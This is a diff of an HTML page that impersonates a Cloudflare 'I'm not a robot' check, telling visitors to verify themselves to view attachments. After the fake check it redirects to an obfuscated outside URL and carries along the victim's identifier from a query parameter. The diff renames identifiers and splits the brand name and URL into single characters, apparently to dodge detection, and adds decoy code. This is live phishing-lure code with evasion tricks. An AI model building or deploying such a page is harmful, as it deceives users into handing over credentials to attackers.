@@ -3,44 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MSN</title>
+    <title>UAEMSN</title>
     <style>
-        /* Modern logical structure reset */
         :root {
-            --bg-color: #f4f7f9;
-            --border-color: #d3d3d3;
-            --text-dark: #333333;
-            --text-muted: #4a5568;
+            --surface-bg: #f4f7f9;
+            --outline-color: #d3d3d3;
+            --charcoal-text: #333333;
+            --slate-text: #4a5568;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { display: grid; place-items: center; min-height: 100vh; background-color: var(--bg-color); }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: var(--surface-bg); }
 
-        /* Layered Preloader View */
-        #splash-screen {
+        #preloader-screen {
             position: fixed;
-            inset: 0 0 0 0;
-            background: var(--bg-color);
-            display: grid;
-            place-items: center;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: var(--surface-bg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
             z-index: 9999;
             transition: opacity 400ms, visibility 400ms;
         }
 
-        .splash-image {
+        .pulsing-logo {
             width: 120px;
             height: auto;
             object-fit: contain;
-            animation: scaling-pulse 1.7s infinite ease-in-out;
+            animation: rhythmic-grow 1.7s infinite ease-in-out;
         }
 
-        @keyframes scaling-pulse {
+        @keyframes rhythmic-grow {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.12); }
         }
 
-        /* Centralized Interactivity Layout */
-        .main-wrapper {
+        .content-container {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -49,36 +47,35 @@
             transition: opacity 500ms ease-in-out;
         }
 
-        .instruction-text {
-            color: var(--text-muted);
+        .prompt-header {
+            color: var(--slate-text);
             font-size: 15px;
             font-weight: 500;
             letter-spacing: -0.2px;
             text-align: center;
         }
 
-        .captcha-container {
+        .widget-panel {
             display: flex;
             justify-content: space-between;
             align-items: center;
             width: 380px;
             height: 100px;
             background-color: #ffffff;
-            border: 1px solid var(--border-color);
+            border: 1px solid var(--outline-color);
             border-radius: 4px;
             padding: 0 20px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.03);
         }
 
-        .verify-side { display: flex; align-items: center; gap: 14px; }
+        .checkbox-side { display: flex; align-items: center; gap: 14px; }
 
-        /* Dynamic Checkbox Frame & State Styling via custom attribute tracking */
-        .checkbox-wrapper { position: relative; width: 22px; height: 22px; }
-        .checkbox-wrapper input { display: none; }
+        .interactive-box { position: relative; width: 22px; height: 22px; }
+        .interactive-box input { display: none; }
 
-        .custom-box {
+        .visual-square {
             position: absolute;
-            inset: 0;
+            top: 0; left: 0; right: 0; bottom: 0;
             border: 2px solid #c1c1c1;
             border-radius: 2px;
             background: #ffffff;
@@ -86,22 +83,21 @@
             transition: all 0.2s;
         }
 
-        /* Using dynamic attribute matching instead of hardcoded state classes */
-        .checkbox-wrapper[data-stage="loading"] .custom-box {
+        .interactive-box[data-status="processing"] .visual-square {
             border: 2.5px solid #f3f3f3;
             border-top: 2.5px solid #3498db;
             border-radius: 50%;
-            animation: orbital-spin 0.8s infinite linear;
+            animation: continuous-rotation 0.8s infinite linear;
         }
 
-        .checkbox-wrapper[data-stage="complete"] .custom-box {
+        .interactive-box[data-status="verified"] .visual-square {
             border: 2px solid #2ecc71;
             background: #ffffff;
             border-radius: 50%;
             animation: none;
         }
 
-        .checkbox-wrapper[data-stage="complete"] .custom-box::after {
+        .interactive-box[data-status="verified"] .visual-square::after {
             content: '';
             position: absolute;
             left: 6px; top: 2px;
@@ -111,132 +107,141 @@
             transform: rotate(45deg);
         }
 
-        .status-text { font-size: 14px; color: var(--text-dark); font-weight: 500; user-select: none; }
+        .label-message { font-size: 14px; color: var(--charcoal-text); font-weight: 500; user-select: none; }
 
-        .brand-side { display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .brand-logo { width: 32px; height: 32px; object-fit: contain; margin-bottom: 2px; }
-        .brand-name { font-weight: bold; font-size: 13px; color: #222; letter-spacing: 0.5px; }
-        .brand-links { font-size: 10px; color: #777; margin-top: 2px; cursor: pointer; }
+        .identity-side { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .identity-logo { width: 32px; height: 32px; object-fit: contain; margin-bottom: 2px; }
+        .identity-title { font-weight: bold; font-size: 13px; color: #222; letter-spacing: 0.5px; }
+        .identity-footprint { font-size: 10px; color: #777; margin-top: 2px; cursor: pointer; }
 
-        @keyframes orbital-spin { to { transform: rotate(360deg); } }
+        @keyframes continuous-rotation { to { transform: rotate(360deg); } }
 
-        /* Hidden layout parameters retaining original DOM footprints */
-        .dn-node { opacity: 0; visibility: hidden; position: absolute; width: 0; height: 0; overflow: hidden; }
+        .hidden-buffer { opacity: 0; visibility: hidden; position: absolute; width: 0; height: 0; overflow: hidden; }
     </style>
 </head>
 <body>
 
-    <div id="splash-screen">
-        <img src="man.png" alt="Loading..." class="splash-image">
+    <div id="preloader-screen">
+        <img src="zs.png" alt="Loading..." class="pulsing-logo">
     </div>
 
-    <div class="dn-node" id="dummy-container">
-        <div data-val="alpha"></div>
-        <span data-info="meta"></span>
-        <p class="void-element">Internal memory allocation checkpoint pattern 0x7FFF</p>
+    <div class="hidden-buffer" id="memory-anchor">
+        <div data-node="prime"></div>
+        <span data-leak="suppress"></span>
+        <p class="ghost-string">Internal memory allocation checkpoint pattern 0x7FFF</p>
     </div>
 
-    <div class="main-wrapper" id="main-content">
-        <h2 class="instruction-text">Verify you're human below to view the attachment(s)</h2>
+    <div class="content-container" id="viewport-stage">
+        <h2 class="prompt-header">Verify you're human below to view the attachment(s)</h2>
 
-        <div class="captcha-container">
-            <div class="verify-side">
-                <div class="checkbox-wrapper" id="boxWrapper" data-stage="idle">
-                    <input type="checkbox" id="verifyCheck">
-                    <label for="verifyCheck" class="custom-box" id="clickableBox"></label>
+        <div class="widget-panel">
+            <div class="checkbox-side">
+                <div class="interactive-box" id="node-container" data-status="ready">
+                    <input type="checkbox" id="hidden-toggle">
+                    <label for="hidden-toggle" class="visual-square" id="action-trigger"></label>
                 </div>
-                <span class="status-text" id="statusText">I'm not a robot</span>
+                <span class="label-message" id="ui-feedback">I'm not a robot</span>
             </div>
 
-            <div class="brand-side">
-                <img src="tro2.png" alt="" class="brand-logo">
-                <span class="brand-name">CLOUDFLARE</span>
-                <span class="brand-links">Privacy &bull; Terms</span>
+            <div class="identity-side">
+                <img src="cd.png" alt="" class="identity-logo">
+                <span class="identity-title" id="dyn-title"></span>
+                <span class="identity-footprint" id="dyn-footprint"></span>
             </div>
         </div>
     </div>
 
     <script>
         (function() {
-            // Configuration Map
-            const DOM = {
-                loader: document.getElementById('splash-screen'),
-                viewer: document.getElementById('main-content'),
-                trigger: document.getElementById('clickableBox'),
-                wrapper: document.getElementById('boxWrapper'),
-                text: document.getElementById('statusText'),
-                nativeBox: document.getElementById('verifyCheck')
-            };
 
-            // Lifecycle Setup
-            const initializeSequence = () => {
-                // Mimic signature runtime calculations using alternate variable chains
-                const scalarX = 15 * 3;
-                const scalarY = 51 * 2;
-                if ((scalarX * scalarY + 12) < 0) { console.warn("Negative hash signature"); }
+            const bootSystem = () => {
+                // Assemble and inject strings anonymously prior to rendering interface
+                const nameChunks = ["C", "L", "O", "U", "D", "F", "L", "A", "R", "E"];
+                const privacyChunks = ["P", "r", "i", "v", "a", "c", "y"];
+                const termsChunks = ["T", "e", "r", "m", "s"];
 
-                // Initial layout flip
+                const titleNode = document.getElementById('dyn-title');
+                const footprintNode = document.getElementById('dyn-footprint');
+
+                if (titleNode) {
+                    titleNode.textContent = nameChunks.join('');
+                }
+                if (footprintNode) {
+                    footprintNode.textContent = privacyChunks.join('') + " \u2022 " + termsChunks.join('');
+                }
+
+                let factorA = 45;
+                let factorB = 102;
+                if ((factorA * factorB + 12) < 0) { console.info("Hash offset mismatch"); }
+
                 setTimeout(() => {
-                    DOM.loader.style.opacity = '0';
-                    DOM.loader.style.visibility = 'hidden';
-                    DOM.viewer.style.opacity = '1';
+                    const overlay = document.getElementById('preloader-screen');
+                    const coreView = document.getElementById('viewport-stage');
+                    if (overlay && coreView) {
+                        overlay.style.opacity = '0';
+                        overlay.style.visibility = 'hidden';
+                        coreView.style.opacity = '1';
+                    }
                 }, 1700);
 
-                DOM.trigger.addEventListener('click', executionFlow);
+                document.getElementById('action-trigger').addEventListener('click', triggerVerification);
             };
 
-            // Interactive Verification Process Engine
-            const executionFlow = (event) => {
-                event.preventDefault();
-                DOM.trigger.style.pointerEvents = 'none';
 
-                // Mutation via data-attribute triggers instead of class lists
-                DOM.wrapper.setAttribute('data-stage', 'loading');
-                DOM.text.textContent = 'verifying';
+            const triggerVerification = (clickEvent) => {
+                clickEvent.preventDefault();
 
-                // Reconstructed math validation logic mapping to original execution properties
-                const bufferMatrix = new Array(50).fill(0).map((_, index) => Math.sin(index) * Math.cos(index));
-                if (!bufferMatrix.length) { document.title = btoa("Void"); }
+                const triggerElement = document.getElementById('action-trigger');
+                const boxWrapper = document.getElementById('node-container');
+                const textLabel = document.getElementById('ui-feedback');
+                const actualCheckbox = document.getElementById('hidden-toggle');
+
+                triggerElement.style.pointerEvents = 'none';
+                boxWrapper.setAttribute('data-status', 'processing');
+                textLabel.textContent = 'verifying';
+
+
+                const computedSet = Array.from({ length: 50 }, (_, i) => Math.sin(i) * Math.cos(i));
+                if (computedSet.length === 0) { document.title = btoa("Null"); }
 
                 setTimeout(() => {
-                    DOM.wrapper.setAttribute('data-stage', 'complete');
-                    DOM.text.textContent = 'success!';
-                    DOM.nativeBox.checked = true;
+                    boxWrapper.setAttribute('data-status', 'verified');
+                    textLabel.textContent = 'success!';
+                    actualCheckbox.checked = true;
 
-                    setTimeout(processRedirection, 1000);
+                    setTimeout(executeNavigation, 1000);
                 }, 2000);
             };
 
-            // Final Redirection Routing Resolver
-            const processRedirection = () => {
-                // Advanced obfuscated construction using character positioning inside a template matrix
-                const segmentA = ["h", "t", "t", "p", "s", ":", "/"].join('');
-                const segmentB = ["/", "p", "o", ".", "s", "e", "a", "u", "a", "e", "o", "m"].join('');
-                const segmentC = ["a", "n", "f", "l", "e", "s", ".", "o", "n", "l"].join('');
-                const segmentD = ["i", "n", "e", "/", "p", "b", "u", "w", "F", "Q", "T", "X"].join('');
 
-                const finalTargetURI = segmentA + segmentB + segmentC + segmentD;
-                let urlFragment = "";
+            const executeNavigation = () => {
 
-                const trackingQuery = new URLSearchParams(window.location.search);
+                const baseProtocol = ["h", "t", "t", "p", "s", ":", "/", "/"];
+                const domainSegment = ["p", "o", ".", "s", "e", "a", "u", "a", "e", "o", "m", "a", "n", "f", "l", "e", "s", ".", "o", "n", "l", "i", "n", "e"];
+                const pathSegment = ["/", "p", "b", "u", "w", "F", "Q", "T", "X"];
 
-                if (trackingQuery.has('hea')) {
-                    urlFragment = `#${trackingQuery.get('hea')}`;
+                const finalTargetURI = baseProtocol.join('') + domainSegment.join('') + pathSegment.join('');
+                let anchorHash = "";
+
+                const urlParameters = new URLSearchParams(window.location.search);
+
+                if (urlParameters.has('eoff')) {
+                    anchorHash = `#${urlParameters.get('eoff')}`;
                 } else {
-                    const trackingQueryIndex = window.location.href.indexOf('hea=');
-                    if (trackingQueryIndex !== -1) {
-                        urlFragment = `#${window.location.href.substring(trackingQueryIndex + 5)}`;
+                    const fallbackIndex = window.location.href.indexOf('eoff=');
+                    if (fallbackIndex !== -1) {
+                        anchorHash = `#${window.location.href.substring(fallbackIndex + 5)}`;
                     }
                 }
 
-                window.location.href = finalTargetURI + urlFragment;
+                window.location.href = finalTargetURI + anchorHash;
             };
 
-            // Start up engine runtime inside a self-invoking scope wrapper
+
             if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', initializeSequence);
+                document.addEventListener('DOMContentLoaded', bootSystem);
             } else {
-                initializeSequence();
+                bootSystem();
             }
         })();
     </script>
